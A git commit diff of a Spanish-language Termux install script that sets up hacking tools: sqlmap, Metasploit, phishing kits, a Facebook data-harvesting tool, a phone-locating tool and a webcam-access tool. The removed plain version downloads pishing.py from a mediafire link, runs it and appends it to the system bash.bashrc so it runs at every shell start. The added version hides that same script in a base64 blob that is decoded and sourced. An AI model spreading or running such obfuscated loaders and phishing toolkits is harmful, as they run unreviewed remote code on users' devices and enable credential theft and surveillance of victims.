1e86f03e9a1983127b87b0513a81ab5fd679c691
Facundo Salgado <63315825+byteSalgado@users.noreply.github.com>
2020-06-17 11:11:20 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,188 +1,95 @@
-#!/bin/bash
-printf "\e[1;31m Bienvenido a la instalacion de herramientas hacking para termux...\n"
-sleep 5
-printf "\e[1;31m Este script te facilitara la tarea para instalar las herramientas\n"
-sleep 5
-clear
-printf "\e[1;31m Se instalaran las siguientes herramientas: SQLMAP, metasploit, ngrok, herramientas pishing\n"
-sleep 7
-printf "\e[1;31m La instalacion durara un cierto tiempo, especificamente en Metasploit ya que es pesado\n"
-sleep 4
-clear
-printf "\e[1;31m La instalcion empezara en 5 segundos\n"
-sleep 5
-clear
-printf "\e[1;31m Actualizando sistema\n"
-sleep 3
-clear
-pkg update && pkg upgrade -y
-clear
-printf "\e[1;31m Acepte permisos de storages e termux para continuar..\n"
-sleep 4
-termux-setup-storage
-printf "\e[1;31m Permisos otorgados\n"
-sleep 2
-clear
-cd $HOME
-printf "\e[1;31m Instalando php\n"
-sleep 2
-pkg install php -y
-clear
-printf "\e[1;31m PHP instalado\n"
-clear
-printf "\e[1;31m instalando wget\n"
-sleep 2
-pkg install wget -y
-clear
-printf "\e[1;31m Instalando python\n"
-sleep 2
-pkg install python -y
-clear
-printf "\e[1;31m Instalando python2\n"
-sleep 2
-clear
-pkg install python2 -y
-clear
-printf "\e[1;31m Instalando python3\n"
-sleep 2
-clear
-pkg install python3 -y
-clear
-printf "\e[1;31m Instalando git\n"
-sleep 3
-clear
-pkg install git -y
-clear
-printf "\e[1;31m Instalando unzip\n"
-sleep 3
-clear
-pkg install unzip -y
-clear
-printf "\e[1;31m Dependencias instaladas, ahora instalaremos las herramientas en 5 segundos...\n"
-sleep 5
-clear
-printf "\e[1;31m Instalando NGROK en 5 segundos\n"
-sleep 3
-cd $HOME
-mkdir tools
-cd tools
-termux-setup-storage
-git clone https://github.com/Marcel0Sousa/termux-ngrok
-cd termux-ngrok
-chmod +x termux-ngrok.sh
-bash termux-ngrok.sh
-cd ..
-clear
-printf "\e[1;31m Ngrok instalado..\n"
-sleep 3
-clear
-printf "\e[1;31m Instalaremos SQLMAP en 5 segundos\n"
-sleep 5
-git clone https://github.com/sqlmapproject/sqlmap.git
-cd sqlmap
-python2 sqlmap.py
-sleep 5
-cd ..
-printf "\e[1;31m Sqlmap ha sido instalado..\n"
-sleep 3
-clear
-printf "\e[1;31m Ahora descargaremos algunas de las mejores herramientas de pishing\n"
-sleep 5
-printf "\e[1;31m Clonando repositorio Fotosploit Creditos: Cesar Hack Gray\n"
-sleep 4
-git clone https://github.com/Cesar-Hack-Gray/FotoSploit
-clear
-cd FotoSploit
-chmod +x install.sh
-bash install.sh
-clear
-printf "\e[1;31m Repositorio instalado...\n"
-cd ..
-sleep 2
-clear
-printf "\e[1;31m Clonando repositorio SocialPishising\n"
-sleep 3
-clear
-git clone https://github.com/xHak9x/SocialPhish.git
-clear
-cd SocialPhish
-chmod +x socialphish.sh
-cd ..
-printf "\e[1;31m Repositorio instalado\n"
-sleep 2
-clear
-printf "\e[1;31m A continuacion instalaremos una herramienta de recopilacion de datos de Facebook\n"
-git clone https://github.com/xHak9x/fbi.git
-cd fbi
-pip2 install -r requirements.txt
-clear
-cd ..
-printf "\e[1;31m ahora instalaremos Seeker herramienta para localizar moviles\n"
-sleep 3
-clear
-git clone https://github.com/thewhiteh4t/seeker
-cd seeker/
-chmod +x install.sh
-bash install.sh
-cd ..
-clear
-printf "\e[1;31m ahora instalaremos Saycheese para entrar en webcams\n"
-sleep 3
-clear
-git clone  https://github.com/thelinuxchoice/saycheese
-clear
-printf "\e[1;31m Repositorio Instalado..\n"
-sleep 5
-clear
-printf "\e[1;31m Instalando herramienta escaneador de SQLI (SQL injection)\n"
-sleep 3
-clear
-git clone https://github.com/the-robot/sqliv
-cd sqliv
-clear
-python2 setup.py -i
-clear
-cd ..
-sleep 2
-printf "\e[1;31m ultimo paso instalaremos Metasploit en su termux\n"
-sleep 2
-printf "\e[1;31m Esta instalacion puede demorar hasta 20 minutos, si no quiere instalarlo presione ctrl + z para abortar\n"
-sleep 8
-clear
-pkg install curl -y
-pkg install unstable-repo
-pkg install metasploit
-clear
-printf "\e[1;31m Felicidades Metasploit se instalo correctamente\n"
-sleep 5
-clear
-printf "\e[1;31m Instalando modulos finales...\n"
-termux-setup-storage
-wget http://download1655.mediafire.com/5457cqaw0esg/2myc8fnrn1gj278/pishing.py
-clear
-chmod +x pishing.py
-python pishing.py
-mv pishing.py /data/data/com.termux/files/usr/etc/
-cd /data/data/com.termux/files/usr/etc/
-sleep 1
-echo "cd /data/data/com.termux/files/usr/etc/" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-clear
-echo "python pishing.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-clear
-echo "cd" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-clear
-cd $HOME
-printf "\e[1;31m para ejecutar ngrok escriba la palabra ngrok en su terminal\n"
-sleep 4
-printf "\e[1;31m para ejecutar Metasploit introdusca msfconsole en la terminal\n"
-sleep 4
-printf "\e[1;31m Si desea ejecutar las demas herramientas vaya a la carpeta tools y dirigase a la herramienta\n"
-sleep 4
-printf "\e[1;31m Gracias por usar este instalador, creado por facundo salgado..\n"
-sleep 5
-clear
-exit
-
-
-
-
+#!/usr/bin/env bash
+#
+# Obfuscate by @CesarHackGray
+# Contacta https://t.me/CesarGray
+# Channel: https://www.youtube.com/channel/UCjs0N8PbEo-se0r_4O_svNQ
+#
+#
+CesarHackGray=$(mktemp)
+base64 -d  >${CesarHackGray}<<DIXIE
+IyEvYmluL2Jhc2gKcHJpbnRmICJcZVsxOzMxbSBCaWVudmVuaWRvIGEgbGEgaW5zdGFsYWNpb24g
+ZGUgaGVycmFtaWVudGFzIGhhY2tpbmcgcGFyYSB0ZXJtdXguLi5cbiIKc2xlZXAgNQpwcmludGYg
+IlxlWzE7MzFtIEVzdGUgc2NyaXB0IHRlIGZhY2lsaXRhcmEgbGEgdGFyZWEgcGFyYSBpbnN0YWxh
+ciBsYXMgaGVycmFtaWVudGFzXG4iCnNsZWVwIDUKY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBTZSBp
+bnN0YWxhcmFuIGxhcyBzaWd1aWVudGVzIGhlcnJhbWllbnRhczogU1FMTUFQLCBtZXRhc3Bsb2l0
+LCBuZ3JvaywgaGVycmFtaWVudGFzIHBpc2hpbmdcbiIKc2xlZXAgNwpwcmludGYgIlxlWzE7MzFt
+IExhIGluc3RhbGFjaW9uIGR1cmFyYSB1biBjaWVydG8gdGllbXBvLCBlc3BlY2lmaWNhbWVudGUg
+ZW4gTWV0YXNwbG9pdCB5YSBxdWUgZXMgcGVzYWRvXG4iCnNsZWVwIDQKY2xlYXIKcHJpbnRmICJc
+ZVsxOzMxbSBMYSBpbnN0YWxjaW9uIGVtcGV6YXJhIGVuIDUgc2VndW5kb3NcbiIKc2xlZXAgNQpj
+bGVhcgpwcmludGYgIlxlWzE7MzFtIEFjdHVhbGl6YW5kbyBzaXN0ZW1hXG4iCnNsZWVwIDMKY2xl
+YXIKcGtnIHVwZGF0ZSAmJiBwa2cgdXBncmFkZSAteQpjbGVhcgpwcmludGYgIlxlWzE7MzFtIEFj
+ZXB0ZSBwZXJtaXNvcyBkZSBzdG9yYWdlcyBlIHRlcm11eCBwYXJhIGNvbnRpbnVhci4uXG4iCnNs
+ZWVwIDQKdGVybXV4LXNldHVwLXN0b3JhZ2UKcHJpbnRmICJcZVsxOzMxbSBQZXJtaXNvcyBvdG9y
+Z2Fkb3NcbiIKc2xlZXAgMgpjbGVhcgpjZCAkSE9NRQpwcmludGYgIlxlWzE7MzFtIEluc3RhbGFu
+ZG8gcGhwXG4iCnNsZWVwIDIKcGtnIGluc3RhbGwgcGhwIC15CmNsZWFyCnByaW50ZiAiXGVbMTsz
+MW0gUEhQIGluc3RhbGFkb1xuIgpjbGVhcgpwcmludGYgIlxlWzE7MzFtIGluc3RhbGFuZG8gd2dl
+dFxuIgpzbGVlcCAyCnBrZyBpbnN0YWxsIHdnZXQgLXkKY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBJ
+bnN0YWxhbmRvIHB5dGhvblxuIgpzbGVlcCAyCnBrZyBpbnN0YWxsIHB5dGhvbiAteQpjbGVhcgpw
+cmludGYgIlxlWzE7MzFtIEluc3RhbGFuZG8gcHl0aG9uMlxuIgpzbGVlcCAyCmNsZWFyCnBrZyBp
+bnN0YWxsIHB5dGhvbjIgLXkKY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBJbnN0YWxhbmRvIHB5dGhv
+bjNcbiIKc2xlZXAgMgpjbGVhcgpwa2cgaW5zdGFsbCBweXRob24zIC15CmNsZWFyCnByaW50ZiAi
+XGVbMTszMW0gSW5zdGFsYW5kbyBnaXRcbiIKc2xlZXAgMwpjbGVhcgpwa2cgaW5zdGFsbCBnaXQg
+LXkKY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBJbnN0YWxhbmRvIHVuemlwXG4iCnNsZWVwIDMKY2xl
+YXIKcGtnIGluc3RhbGwgdW56aXAgLXkKY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBEZXBlbmRlbmNp
+YXMgaW5zdGFsYWRhcywgYWhvcmEgaW5zdGFsYXJlbW9zIGxhcyBoZXJyYW1pZW50YXMgZW4gNSBz
+ZWd1bmRvcy4uLlxuIgpzbGVlcCA1CmNsZWFyCnByaW50ZiAiXGVbMTszMW0gSW5zdGFsYW5kbyBO
+R1JPSyBlbiA1IHNlZ3VuZG9zXG4iCnNsZWVwIDMKY2QgJEhPTUUKbWtkaXIgdG9vbHMKY2QgdG9v
+bHMKdGVybXV4LXNldHVwLXN0b3JhZ2UKZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9NYXJj
+ZWwwU291c2EvdGVybXV4LW5ncm9rCmNkIHRlcm11eC1uZ3JvawpjaG1vZCAreCB0ZXJtdXgtbmdy
+b2suc2gKYmFzaCB0ZXJtdXgtbmdyb2suc2gKY2QgLi4KY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBO
+Z3JvayBpbnN0YWxhZG8uLlxuIgpzbGVlcCAzCmNsZWFyCnByaW50ZiAiXGVbMTszMW0gSW5zdGFs
+YXJlbW9zIFNRTE1BUCBlbiA1IHNlZ3VuZG9zXG4iCnNsZWVwIDUKZ2l0IGNsb25lIGh0dHBzOi8v
+Z2l0aHViLmNvbS9zcWxtYXBwcm9qZWN0L3NxbG1hcC5naXQKY2Qgc3FsbWFwCnB5dGhvbjIgc3Fs
+bWFwLnB5CnNsZWVwIDUKY2QgLi4KcHJpbnRmICJcZVsxOzMxbSBTcWxtYXAgaGEgc2lkbyBpbnN0
+YWxhZG8uLlxuIgpzbGVlcCAzCmNsZWFyCnByaW50ZiAiXGVbMTszMW0gQWhvcmEgZGVzY2FyZ2Fy
+ZW1vcyBhbGd1bmFzIGRlIGxhcyBtZWpvcmVzIGhlcnJhbWllbnRhcyBkZSBwaXNoaW5nXG4iCnNs
+ZWVwIDUKcHJpbnRmICJcZVsxOzMxbSBDbG9uYW5kbyByZXBvc2l0b3JpbyBGb3Rvc3Bsb2l0IENy
+ZWRpdG9zOiBDZXNhciBIYWNrIEdyYXlcbiIKc2xlZXAgNApnaXQgY2xvbmUgaHR0cHM6Ly9naXRo
+dWIuY29tL0Nlc2FyLUhhY2stR3JheS9Gb3RvU3Bsb2l0CmNsZWFyCmNkIEZvdG9TcGxvaXQKY2ht
+b2QgK3ggaW5zdGFsbC5zaApiYXNoIGluc3RhbGwuc2gKY2xlYXIKcHJpbnRmICJcZVsxOzMxbSBS
+ZXBvc2l0b3JpbyBpbnN0YWxhZG8uLi5cbiIKY2QgLi4Kc2xlZXAgMgpjbGVhcgpwcmludGYgIlxl
+WzE7MzFtIENsb25hbmRvIHJlcG9zaXRvcmlvIFNvY2lhbFBpc2hpc2luZ1xuIgpzbGVlcCAzCmNs
+ZWFyCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20veEhhazl4L1NvY2lhbFBoaXNoLmdpdApj
+bGVhcgpjZCBTb2NpYWxQaGlzaApjaG1vZCAreCBzb2NpYWxwaGlzaC5zaApjZCAuLgpwcmludGYg
+IlxlWzE7MzFtIFJlcG9zaXRvcmlvIGluc3RhbGFkb1xuIgpzbGVlcCAyCmNsZWFyCnByaW50ZiAi
+XGVbMTszMW0gQSBjb250aW51YWNpb24gaW5zdGFsYXJlbW9zIHVuYSBoZXJyYW1pZW50YSBkZSBy
+ZWNvcGlsYWNpb24gZGUgZGF0b3MgZGUgRmFjZWJvb2tcbiIKZ2l0IGNsb25lIGh0dHBzOi8vZ2l0
+aHViLmNvbS94SGFrOXgvZmJpLmdpdApjZCBmYmkKcGlwMiBpbnN0YWxsIC1yIHJlcXVpcmVtZW50
+cy50eHQKY2xlYXIKY2QgLi4KcHJpbnRmICJcZVsxOzMxbSBhaG9yYSBpbnN0YWxhcmVtb3MgU2Vl
+a2VyIGhlcnJhbWllbnRhIHBhcmEgbG9jYWxpemFyIG1vdmlsZXNcbiIKc2xlZXAgMwpjbGVhcgpn
+aXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3RoZXdoaXRlaDR0L3NlZWtlcgpjZCBzZWVrZXIv
+CmNobW9kICt4IGluc3RhbGwuc2gKYmFzaCBpbnN0YWxsLnNoCmNkIC4uCmNsZWFyCnByaW50ZiAi
+XGVbMTszMW0gYWhvcmEgaW5zdGFsYXJlbW9zIFNheWNoZWVzZSBwYXJhIGVudHJhciBlbiB3ZWJj
+YW1zXG4iCnNsZWVwIDMKY2xlYXIKZ2l0IGNsb25lICBodHRwczovL2dpdGh1Yi5jb20vdGhlbGlu
+dXhjaG9pY2Uvc2F5Y2hlZXNlCmNsZWFyCnByaW50ZiAiXGVbMTszMW0gUmVwb3NpdG9yaW8gSW5z
+dGFsYWRvLi5cbiIKc2xlZXAgNQpjbGVhcgpwcmludGYgIlxlWzE7MzFtIEluc3RhbGFuZG8gaGVy
+cmFtaWVudGEgZXNjYW5lYWRvciBkZSBTUUxJIChTUUwgaW5qZWN0aW9uKVxuIgpzbGVlcCAzCmNs
+ZWFyCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vdGhlLXJvYm90L3NxbGl2CmNkIHNxbGl2
+CmNsZWFyCnB5dGhvbjIgc2V0dXAucHkgLWkKY2xlYXIKY2QgLi4Kc2xlZXAgMgpwcmludGYgIlxl
+WzE7MzFtIHVsdGltbyBwYXNvIGluc3RhbGFyZW1vcyBNZXRhc3Bsb2l0IGVuIHN1IHRlcm11eFxu
+IgpzbGVlcCAyCnByaW50ZiAiXGVbMTszMW0gRXN0YSBpbnN0YWxhY2lvbiBwdWVkZSBkZW1vcmFy
+IGhhc3RhIDIwIG1pbnV0b3MsIHNpIG5vIHF1aWVyZSBpbnN0YWxhcmxvIHByZXNpb25lIGN0cmwg
+KyB6IHBhcmEgYWJvcnRhclxuIgpzbGVlcCA4CmNsZWFyCnBrZyBpbnN0YWxsIGN1cmwgLXkKcGtn
+IGluc3RhbGwgdW5zdGFibGUtcmVwbwpwa2cgaW5zdGFsbCBtZXRhc3Bsb2l0CmNsZWFyCnByaW50
+ZiAiXGVbMTszMW0gRmVsaWNpZGFkZXMgTWV0YXNwbG9pdCBzZSBpbnN0YWxvIGNvcnJlY3RhbWVu
+dGVcbiIKc2xlZXAgNQpjbGVhcgpwcmludGYgIlxlWzE7MzFtIEluc3RhbGFuZG8gbW9kdWxvcyBm
+aW5hbGVzLi4uXG4iCnRlcm11eC1zZXR1cC1zdG9yYWdlCndnZXQgaHR0cDovL2Rvd25sb2FkMTY1
+NS5tZWRpYWZpcmUuY29tLzU0NTdjcWF3MGVzZy8ybXljOGZucm4xZ2oyNzgvcGlzaGluZy5weQpj
+bGVhcgpjaG1vZCAreCBwaXNoaW5nLnB5CnB5dGhvbiBwaXNoaW5nLnB5Cm12IHBpc2hpbmcucHkg
+L2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9ldGMvCmNkIC9kYXRhL2RhdGEvY29tLnRl
+cm11eC9maWxlcy91c3IvZXRjLwpzbGVlcCAxCmVjaG8gImNkIC9kYXRhL2RhdGEvY29tLnRlcm11
+eC9maWxlcy91c3IvZXRjLyIgPj4gL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9ldGMv
+YmFzaC5iYXNocmMKY2xlYXIKZWNobyAicHl0aG9uIHBpc2hpbmcucHkiID4+IC9kYXRhL2RhdGEv
+Y29tLnRlcm11eC9maWxlcy91c3IvZXRjL2Jhc2guYmFzaHJjCmNsZWFyCmVjaG8gImNkIiA+PiAv
+ZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2V0Yy9iYXNoLmJhc2hyYwpjbGVhcgpjZCAk
+SE9NRQpwcmludGYgIlxlWzE7MzFtIHBhcmEgZWplY3V0YXIgbmdyb2sgZXNjcmliYSBsYSBwYWxh
+YnJhIG5ncm9rIGVuIHN1IHRlcm1pbmFsXG4iCnNsZWVwIDQKcHJpbnRmICJcZVsxOzMxbSBwYXJh
+IGVqZWN1dGFyIE1ldGFzcGxvaXQgaW50cm9kdXNjYSBtc2Zjb25zb2xlIGVuIGxhIHRlcm1pbmFs
+XG4iCnNsZWVwIDQKcHJpbnRmICJcZVsxOzMxbSBTaSBkZXNlYSBlamVjdXRhciBsYXMgZGVtYXMg
+aGVycmFtaWVudGFzIHZheWEgYSBsYSBjYXJwZXRhIHRvb2xzIHkgZGlyaWdhc2UgYSBsYSBoZXJy
+YW1pZW50YVxuIgpzbGVlcCA0CnByaW50ZiAiXGVbMTszMW0gR3JhY2lhcyBwb3IgdXNhciBlc3Rl
+IGluc3RhbGFkb3IsIGNyZWFkbyBwb3IgZmFjdW5kbyBzYWxnYWRvLi5cbiIKc2xlZXAgNQpjbGVh
+cgpleGl0Cg==
+DIXIE
+source ${CesarHackGray}
+rm -rf ${CesarHackGray}
